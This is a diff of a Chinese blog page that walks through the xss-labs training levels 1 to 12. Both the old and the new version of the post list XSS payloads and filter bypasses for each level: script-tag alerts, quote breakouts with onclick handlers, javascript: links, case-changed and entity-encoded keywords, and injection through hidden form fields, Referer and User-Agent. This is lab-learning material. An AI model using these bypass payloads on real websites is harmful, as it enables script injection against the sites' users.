@@ -16,15 +16,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="xss-lib注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。level1.php?name&#x3D;《script&gt;alert(“xss”)《&#x2F;script&gt;第二关：test”&gt;《script&gt;alert(“xss”)《&#x2F;script&amp;">
+    <meta name="description" content="xss-libLess1在url上写一个弹窗脚本 Less2输入的&lt;被进行HTML实体编码“&gt;Less3value输入的内容进行了过滤构造一个payload‘ onclick&#x3D;alert() ‘ Less4输入脚本的后，点击搜索，可以看见原本的&lt;直接被过滤“ onclick&#x3D;alert(1) “ Less5“ &#x2F;&gt; Less6将内容进行了过滤,">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss-labs1-12关">
 <meta property="og:url" content="http://example.com/2022/04/22/xss-labs1-12%E5%85%B3/index.html">
 <meta property="og:site_name" content="王海兴">
-<meta property="og:description" content="xss-lib注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。level1.php?name&#x3D;《script&gt;alert(“xss”)《&#x2F;script&gt;第二关：test”&gt;《script&gt;alert(“xss”)《&#x2F;script&amp;">
+<meta property="og:description" content="xss-libLess1在url上写一个弹窗脚本 Less2输入的&lt;被进行HTML实体编码“&gt;Less3value输入的内容进行了过滤构造一个payload‘ onclick&#x3D;alert() ‘ Less4输入脚本的后，点击搜索，可以看见原本的&lt;直接被过滤“ onclick&#x3D;alert(1) “ Less5“ &#x2F;&gt; Less6将内容进行了过滤,">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-04-21T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-22T13:13:57.395Z">
+<meta property="article:modified_time" content="2022-04-24T11:18:53.563Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -196,7 +196,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      672 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11 分钟
+      6 分钟
     </span>
   
 
@@ -245,7 +245,16 @@
             <h1 style="display: none">xss-labs1-12关</h1>
             
             <div class="markdown-body">
-              <p>xss-lib<br>注：为防止不必要的麻烦，统一把&lt;&gt;替换成《&gt;<br>第一关：get请求的name变量放入xss poc,完整的返回在html中，浏览器响应xss poc。<br>level1.php?name&#x3D;《script&gt;alert(“xss”)《&#x2F;script&gt;<br>第二关：test”&gt;《script&gt;alert(“xss”)《&#x2F;script&gt;&#x2F;&#x2F; 完成闭合<br>第三关：查看源码对&gt;进行了过滤 ‘ onclick&#x3D;’alert(1)<br>第四关：同上 “onclick&#x3D;”alert(1)<br>第五关：尝试”onclick&#x3D;”alert(1)发现对on经行过滤<br>再尝试test”《script&gt;alert(“xss”)《&#x2F;script&gt;&#x2F;&#x2F; 发现对script进行过滤<br>但&gt;没进行过滤利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript<br>伪协议，”&gt;《a href&#x3D;’javascript:alert(1)’&gt;a《&#x2F;a&gt;&#x2F;&#x2F;,没有对javascript进行过滤，触发xss<br>第六关：”&gt;《a HrEf&#x3D;’javascript:alert(1)’&gt;a《&#x2F;a&gt;&#x2F;&#x2F;大小写绕过<br>第七关：test” &#x2F;&gt;《a hrhrefef&#x3D;”javascscriptript:alert(1)”&gt;a《&#x2F;a&gt;&#x2F;&#x2F; 重写绕过<br>第八关：把javascript:alert(1)进行编码绕过<br>第九关：采用第八关的poc，发现poc中应包含合法的url，poc中添加&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.baidu.com,发现可以进行绕过/">http://www.baidu.com,发现可以进行绕过</a><br>第十关：.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type&#x3D;”text” onclick&#x3D;”alert(1)”，web浏览器成功执行 。ps:type&#x3D;”text”为构造一个文本框，用来触发onclick事件<br>test&amp;t_sort&#x3D;”type&#x3D;”text” onclick&#x3D;”alert(1)”<br>第十一关：根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点<br>修改refer “type&#x3D;”text” onclick&#x3D;”alert(1)”<br>第十二关：根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点<br>修改user-agent “type&#x3D;”text” onclick&#x3D;”alert(1)”</p>
+              <p>xss-lib<br>Less1<br>在url上写一个弹窗脚本</p>
+<p>Less2<br>输入的&lt;被进行HTML实体编码<br>“&gt;<br>Less3<br>value输入的内容进行了过滤<br>构造一个payload<br>‘ onclick&#x3D;alert() ‘</p>
+<p>Less4<br>输入脚本的后，点击搜索，可以看见原本的&lt;直接被过滤<br>“ onclick&#x3D;alert(1) “</p>
+<p>Less5<br>“ &#x2F;&gt;</p>
+<p>Less6<br>将内容进行了过滤,只有Javascript 没被过滤<br>“ &#x2F;&gt;</p>
+<p>Leve7<br>“&gt;alert()</p>
+<p>Less8<br>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert()</p>
+<p>Less9<br>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert()&#x2F;&#x2F;http:&#x2F;&#x2F;</p>
+<p>Less10<br>t_sort&#x3D;” οnclick&#x3D;alert() type&#x3D;”button””<br>less11<br>根据返回的html判断refer字段为web页面的自定义变量，可能存在xss注入点<br>修改refer “type&#x3D;”text” onclick&#x3D;”alert(1)”</p>
+<p>less12<br>根据返回的html判断user-agent字段为web页面的自定义变量，可能存在xss注入点<br>修改user-agent “type&#x3D;”text” onclick&#x3D;”alert(1)”</p>
 
             </div>
             <hr>
@@ -266,18 +275,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/22/xss%E6%BC%8F%E6%B4%9E/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">xss漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
-                        <span class="hidden-mobile">文件包含漏洞</span>
+                      <a href="/2022/04/22/xss%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">xss漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
